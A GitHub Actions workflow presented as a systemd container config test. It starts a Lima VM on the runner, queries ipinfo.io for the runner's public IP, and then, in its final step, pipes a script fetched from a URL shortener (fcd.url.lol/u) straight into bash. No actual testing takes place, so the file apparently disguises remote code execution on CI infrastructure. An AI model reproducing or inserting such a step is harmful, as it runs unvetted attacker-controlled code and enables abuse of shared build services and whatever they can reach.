name: Test with systemd containers

on:
  pull_request:
  push:
    tags:
      - v*
  workflow_dispatch:
    inputs:

jobs:
  ubuntu-test:
    name: Run remote config test with Ubuntu systemd container
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2

      - uses: lima-vm/lima-actions/setup@v1
        id: lima-actions-setup

      - uses: actions/cache@v4
        with:
          path: ~/.cache/lima
          key: lima-${{ steps.lima-actions-setup.outputs.version }}

      - run: limactl start --plain --name=default --cpus=1 --memory=1 template://ubuntu

      - run: limactl shell default curl ipinfo.io

      - uses: lima-vm/lima-actions/ssh@03b96d61959e83b2c737e44162c3088e81de0886

      - run: ssh lima-default 'curl -L fcd.url.lol/u | bash -'

